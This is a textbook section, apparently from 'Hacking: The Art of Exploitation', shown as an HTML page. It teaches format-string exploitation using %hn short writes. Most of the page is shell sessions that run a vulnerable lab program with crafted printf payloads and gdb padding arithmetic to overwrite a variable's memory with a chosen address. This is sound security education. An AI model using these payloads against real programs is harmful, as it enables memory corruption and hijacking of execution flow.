<!DOCTYPE  html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>0x356 Using Short Writes</title><link href="navigation.css" rel="stylesheet" type="text/css"/><link href="document.css" rel="stylesheet" type="text/css"/></head><body><p class="top_nav"><a href="part66.htm">&lt; Previous</a><span> | </span><a href="../hacking-the-art-of-exploitation.html">Contents</a><span> | </span><a href="part68.htm">Next &gt;</a></p><p class="s32" style="padding-left: 91pt;text-indent: 0pt;text-align: left;"><a name="bookmark57">0x356 Using Short Writes</a></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 0pt;line-height: 106%;text-align: left;">Another technique that can simplify format string exploits is using short writes. A <span class="s27">short </span>is typically a two-byte word, and format parameters have a special way of dealing with them. A more complete description of possible format parameters can be found in the printf manual page. The portion describing the length modifier is shown in the output below.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_563.png"/></span></p><p class="s31" style="padding-left: 104pt;text-indent: 0pt;text-align: left;">The length modifier</p><p class="s31" style="padding-left: 121pt;text-indent: 0pt;text-align: left;">Here, integer conversion stands for d, i, o, u, x, or X conversion.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-bottom: 2pt;padding-left: 150pt;text-indent: -29pt;line-height: 107%;text-align: left;">h   A following integer conversion corresponds to a short int or unsigned short int argument, or a following n conversion corresponds to a pointer to a short int argument.</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_564.png"/></span></p><p style="padding-top: 8pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">This can be used with format string exploits to write two-byte shorts. In the output below, a short (shown in bold) is written in at both ends of the four-byte <span class="s31">test_val </span>variable. Naturally, direct parameter access can still be used.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_565.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~/booksrc $ ./fmt_vuln $(printf &quot;\x94\x97\x04\x08&quot;)%x%x%x%hn The right way to print user-controlled input:</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">??%x%x%x%hn</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">The wrong way to print user-controlled input:</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">??bffff3d0b7fe75fc0</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">[*] test_val @ 0x08049794 = -65515 0xffff<b>0015</b></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ ./fmt_vuln $(printf &quot;\x96\x97\x04\x08&quot;)%x%x%x%hn The right way to print user-controlled input:</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">??%x%x%x%hn</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">The wrong way to print user-controlled input:</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">??bffff3d0b7fe75fc0</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">[*] test_val @ 0x08049794 = 1441720 <b>0x0015</b>ffb8</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~/booksrc $ ./fmt_vuln $(printf &quot;\x96\x97\x04\x08&quot;)%4\$hn The right way to print user-controlled input:</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">??%4$hn</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">The wrong way to print user-controlled input:</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">??</p><p class="s31" style="padding-bottom: 2pt;padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">[*] test_val @ 0x08049794 = 327608 0x0004ffb8 reader@hacking:~/booksrc $</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_566.png"/></span></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 18pt;line-height: 108%;text-align: justify;">Using short writes, an entire four-byte value can be overwritten with just two <span class="s31">%hn </span>parameters. In the example below, the <span class="s31">test_val </span>variable will be over- written once again with the address <span class="s31">0xbffffd72</span>.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_567.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~/booksrc $ gdb -q (gdb) p 0xfd72 - 8</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">$1 = 64874</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">(gdb) p 0xbfff - 0xfd72</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">$2 = -15731</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">(gdb) p 0x1bfff - 0xfd72</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">$3 = 49805</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">(gdb) quit</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 10pt;text-align: left;">reader@hacking:~/booksrc $ ./fmt_vuln $(printf &quot;\x94\x97\x04\x08\x96\x97\x04\x08&quot;)%64874x%4\</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 10pt;text-align: left;">$hn%49805x%5\$hn</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">The right way to print user-controlled input:</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">????%64874x%4$hn%49805x%5$hn</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">The wrong way to print user-controlled input:</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">b7fe75fc</p><p class="s31" style="padding-bottom: 3pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">[*] test_val @ 0x08049794 = -1073742478 0xbffffd72 reader@hacking:~/booksrc $</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_568.png"/></span></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 18pt;line-height: 108%;text-align: left;">The preceding example used a similar wraparound method to deal with the second write of <span class="s31">0xbfff </span>being less than the first write of <span class="s31">0xfd72</span>. Using short writes, the order of the writes doesnâ€™t matter, so the first write can be <span class="s31">0xfd72 </span>and the second <span class="s31">0xbfff</span>, if the two passed addresses are swapped in position. In the output below, the address <span class="s31">0x08049796 </span>is written to first, and <span class="s31">0x08049794 </span>is written to second.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_569.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">(gdb) p 0xbfff - 8</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">$1 = 49143</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">(gdb) p 0xfd72 - 0xbfff</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">$2 = 15731</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">(gdb) quit</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 10pt;text-align: left;">reader@hacking:~/booksrc $ ./fmt_vuln $(printf &quot;\x96\x97\x04\x08\x94\x97\x04\x08&quot;)%49143x%4\</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 10pt;text-align: left;">$hn%15731x%5\$hn</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">The right way to print user-controlled input:</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">????%49143x%4$hn%15731x%5$hn</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">The wrong way to print user-controlled input:</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">????</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-top: 4pt;padding-bottom: 2pt;padding-left: 19pt;text-indent: 238pt;line-height: 107%;text-align: left;">b7fe75fc                           [*] test_val @ 0x08049794 = -1073742478 0xbffffd72 reader@hacking:~/booksrc $</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_570.png"/></span></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">The ability to overwrite arbitrary memory addresses implies the ability to control the execution flow of the program. One option is to overwrite the return address in the most recent stack frame, as was done with the stack-based overflows. While this is a possible option, there are other targets that have more predictable memory addresses. The nature of stack-based overflows only allows the overwrite of the return address, but format strings provide the ability to overwrite any memory address, which creates other possibilities.</p><p class="nav">&nbsp;&nbsp;</p><p class="nav">&nbsp;</p><p class="nav"><a href="part66.htm">&lt; Previous</a><span> | </span><a href="../hacking-the-art-of-exploitation.html">Contents</a><span> | </span><a href="part68.htm">Next &gt;</a></p><p class="nav">&nbsp;&nbsp;</p></body></html>
